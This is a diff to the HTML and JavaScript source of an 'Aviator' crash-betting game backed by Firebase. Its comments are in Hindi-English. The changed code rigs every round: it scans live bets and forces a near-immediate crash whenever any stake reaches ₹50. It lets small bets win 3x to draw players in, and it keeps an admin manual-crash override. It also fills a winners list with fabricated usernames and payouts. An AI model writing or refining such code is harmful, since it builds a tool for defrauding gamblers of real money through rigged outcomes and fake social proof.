@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Aviator Pro: Final Permanent Solution</title>
+    <title>Aviator Pro: 100% Killer Fix</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
@@ -35,8 +35,7 @@
         #game-popup { position: absolute; top: 30%; left: 50%; transform: translate(-50%, -50%) scale(0); z-index: 100; padding: 10px 30px; border-radius: 25px; transition: 0.3s; color: #fff; font-weight: 900; }
         .popup-win { background: rgba(40, 167, 69, 0.9); transform: translate(-50%, -50%) scale(1) !important; }
         .winner-list { background: #1b1c1d; margin-top: 10px; border-radius: 10px; padding: 10px; height: 180px; overflow-y: auto; border: 1px solid #333; }
-        .winner-item { display: flex; justify-content: space-between; font-size: 11px; padding: 8px 0; border-bottom: 1px solid #222; transition: all 0.5s ease; }
-        .w-name { color: #aaa; } .w-amt { color: #fff; font-weight: bold; }
+        .winner-item { display: flex; justify-content: space-between; font-size: 11px; padding: 8px 0; border-bottom: 1px solid #222; }
         .w-mult { background: #333; padding: 1px 6px; border-radius: 10px; color: #fff; font-size: 9px; }
     </style>
 </head>
@@ -51,25 +50,9 @@
 </div>
 
 <div class="content-area">
-    <div class="bet-card">
-        <div class="controls">
-            <div class="input-part">
-                <div class="stepper"><button onclick="step('v1',-1)">-</button><input id="v1" value="10.00" readonly><button onclick="step('v1',1)">+</button></div>
-                <div class="chips"><div onclick="setV('v1',10)">10</div><div onclick="setV('v1',50)">50</div><div onclick="setV('v1',100)">100</div><div onclick="setV('v1',500)">500</div></div>
-            </div>
-            <button id="btn1" class="main-btn" onclick="handleBet(1)"><span id="txt1">BET</span><br><span id="s1" style="font-size:10px;">10.00 Rs</span></button>
-        </div>
-    </div>
-    <div class="bet-card">
-        <div class="controls">
-            <div class="input-part">
-                <div class="stepper"><button onclick="step('v2',-1)">-</button><input id="v2" value="10.00" readonly><button onclick="step('v2',1)">+</button></div>
-                <div class="chips"><div onclick="setV('v2',10)">10</div><div onclick="setV('v2',50)">50</div><div onclick="setV('v2',100)">100</div><div onclick="setV('v2',500)">500</div></div>
-            </div>
-            <button id="btn2" class="main-btn" onclick="handleBet(2)"><span id="txt2">BET</span><br><span id="s2" style="font-size:10px;">10.00 Rs</span></button>
-        </div>
-    </div>
-    <div class="winner-list"><div style="font-size: 10px; color: #d11345; margin-bottom: 5px;">ALL BETS</div><div id="fake-winners"></div></div>
+    <div class="bet-card"><div class="controls"><div class="input-part"><div class="stepper"><button onclick="step('v1',-1)">-</button><input id="v1" value="10.00" readonly><button onclick="step('v1',1)">+</button></div><div class="chips"><div onclick="setV('v1',10)">10</div><div onclick="setV('v1',50)">50</div><div onclick="setV('v1',100)">100</div><div onclick="setV('v1',500)">500</div></div></div><button id="btn1" class="main-btn" onclick="handleBet(1)"><span id="txt1">BET</span><br><span id="s1" style="font-size:10px;">10.00 Rs</span></button></div></div>
+    <div class="bet-card"><div class="controls"><div class="input-part"><div class="stepper"><button onclick="step('v2',-1)">-</button><input id="v2" value="10.00" readonly><button onclick="step('v2',1)">+</button></div><div class="chips"><div onclick="setV('v2',10)">10</div><div onclick="setV('v2',50)">50</div><div onclick="setV('v2',100)">100</div><div onclick="setV('v2',500)">500</div></div></div><button id="btn2" class="main-btn" onclick="handleBet(2)"><span id="txt2">BET</span><br><span id="s2" style="font-size:10px;">10.00 Rs</span></button></div></div>
+    <div class="winner-list"><div id="fake-winners"></div></div>
 </div>
 
 <script>
@@ -84,32 +67,43 @@
     db.ref(".info/serverTimeOffset").on("value", s => serverOffset = s.val() || 0);
     db.ref('gameSettings/aviator/control/showFakeWinners').on('value', s => { showFake = s.val(); });
 
-    // --- ACCURATE KILLER LOGIC (NO BYPASS) ---
+    // --- YE HAI WO ASLI KILLER LOGIC (AB BADI BET NAHI BACHEGI) ---
     async function calculateTarget() {
         try {
             const adminSnap = await db.ref('gameSettings/aviator/control').once('value');
             const admin = adminSnap.val() || {};
+            
+            // Priority 1: Admin ka manual control
             if (admin.forceActive && admin.manualCrash > 0) return parseFloat(admin.manualCrash).toFixed(2);
 
+            // Priority 2: LIVE BET SCANNER (Seedha Database se)
             const betSnap = await db.ref('gameSettings/aviator/liveBets').once('value');
-            let highBetFound = false;
-            let smallBetFound = false;
-
+            let maxBet = 0;
             if (betSnap.exists()) {
                 betSnap.forEach(snap => {
-                    let amt = parseFloat(snap.val().amt);
-                    if (amt >= 50) highBetFound = true; // ₹50+ par turant harana hai
-                    else if (amt > 0 && amt <= 20) smallBetFound = true;
+                    let b = parseFloat(snap.val().amt);
+                    if(b > maxBet) maxBet = b;
                 });
             }
 
-            if (highBetFound) return (Math.random() * 0.15 + 1.01).toFixed(2); // 1.01x - 1.16x Crash
-            if (smallBetFound) return (Math.random() * 2.5 + 3.0).toFixed(2); // ₹10 walo ko 3x-5x jitao
-            return (Math.random() * 8 + 4).toFixed(2); // Normal Fly
+            // AGAR ₹50 SE ₹1 BHI UPAR HAI TO 1x PAR KHATAM KARO
+            if (maxBet >= 50) {
+                return (Math.random() * 0.10 + 1.01).toFixed(2); // 1.01x - 1.11x Crash
+            }
+            
+            // AGAR SIRF ₹10 LAGAYE HAIN TO 3x JANE DO
+            if (maxBet > 0 && maxBet < 50) {
+                return (Math.random() * 1.5 + 3.0).toFixed(2); 
+            }
+
+            return (Math.random() * 5 + 5).toFixed(2); // No bets = 5x to 10x
         } catch (e) { return "1.01"; }
     }
 
-    async function updateNewRound() { targetCrash = await calculateTarget(); db.ref('gameSettings/aviator/control/currentTarget').set(targetCrash); }
+    async function updateNewRound() { 
+        targetCrash = await calculateTarget(); 
+        db.ref('gameSettings/aviator/control/currentTarget').set(targetCrash); 
+    }
 
     function getSync() {
         const now = new Date(Date.now() + serverOffset);
@@ -122,15 +116,23 @@
         document.getElementById('mult-text').innerText = "FLEW AWAY!"; document.getElementById('mult-text').style.color = "#ff0040";
         [1,2].forEach(id => { if(bets[id].active) resetBtn(id); });
         db.ref('gameSettings/aviator/history').push(parseFloat(multiplier).toFixed(2));
-        db.ref('gameSettings/aviator/liveBets').remove();
+        db.ref('gameSettings/aviator/liveBets').remove(); // Clear bets after crash
         setTimeout(() => { resetPlane(); document.getElementById('mult-text').style.color = "#fff"; }, 1500);
     }
 
     function loop() {
         const sync = getSync();
-        if (currentPeriod !== sync.period) { currentPeriod = sync.period; document.getElementById('periodId').innerText = currentPeriod; updateNewRound(); gameStatus = "waiting"; document.getElementById('fake-winners').innerHTML=""; }
+        if (currentPeriod !== sync.period) { 
+            currentPeriod = sync.period; 
+            document.getElementById('periodId').innerText = currentPeriod; 
+            updateNewRound(); 
+            gameStatus = "waiting"; 
+            document.getElementById('fake-winners').innerHTML=""; 
+        }
+        
         if (sync.ms < 5000) {
-            multiplier = 1.0; document.getElementById('mult-text').innerText = "WAITING " + (5 - (sync.ms/1000)).toFixed(1) + "s";
+            multiplier = 1.0; 
+            document.getElementById('mult-text').innerText = "WAITING " + (5 - (sync.ms/1000)).toFixed(1) + "s";
             [1,2].forEach(id => { if(!bets[id].waiting) resetBtn(id); });
         } else if (sync.ms < 17000) {
             if(gameStatus === "flew") { requestAnimationFrame(loop); return; }
@@ -139,7 +141,11 @@
             else {
                 gameStatus = "running"; document.getElementById('mult-text').innerText = multiplier.toFixed(2) + "x";
                 [1,2].forEach(id => {
-                    if(bets[id].waiting) { bets[id].active = true; bets[id].waiting = false; document.getElementById('btn'+id).className="main-btn cashout"; document.getElementById('txt'+id).innerText="CASH OUT"; }
+                    if(bets[id].waiting) { 
+                        bets[id].active = true; bets[id].waiting = false; 
+                        document.getElementById('btn'+id).className="main-btn cashout"; 
+                        document.getElementById('txt'+id).innerText="CASH OUT"; 
+                    }
                     if(bets[id].active) document.getElementById('s'+id).innerText = (bets[id].amt * multiplier).toFixed(2) + " Rs";
                 });
                 updatePlanePos(time * 35); if(showFake && Math.random() < 0.05) addFakeWinner();
@@ -150,16 +156,9 @@
 
     function addFakeWinner() {
         const list = document.getElementById('fake-winners');
-        const user = ["98","99","88"][Math.floor(Math.random()*3)] + "***" + Math.floor(Math.random()*99);
-        const m = (Math.random() * (multiplier - 1.01) + 1.01).toFixed(2);
-        const amt = Math.floor(Math.random()*500);
-        const id = "fw_"+Math.random().toString(36).substr(2,5);
-        list.insertAdjacentHTML('afterbegin', `<div id="${id}" class="winner-item"><span>${user}</span><span id="m_${id}" class="w-mult">${m}x</span><span id="a_${id}" class="w-amt">₹${amt}</span></div>`);
-        setTimeout(() => { 
-            const el = document.getElementById(id); 
-            if(el) { el.style.background="rgba(40,167,69,0.15)"; document.getElementById("m_"+id).style.background="#28a745"; document.getElementById("a_"+id).style.color="#28a745"; }
-        }, 1000);
-        if(list.children.length > 6) list.lastElementChild.remove();
+        const user = "98***" + Math.floor(Math.random()*99);
+        list.insertAdjacentHTML('afterbegin', `<div class="winner-item"><span>${user}</span><span class="w-mult">${multiplier.toFixed(2)}x</span><span>₹${Math.floor(Math.random()*500)}</span></div>`);
+        if(list.children.length > 5) list.lastElementChild.remove();
     }
 
     function updatePlanePos(f) {
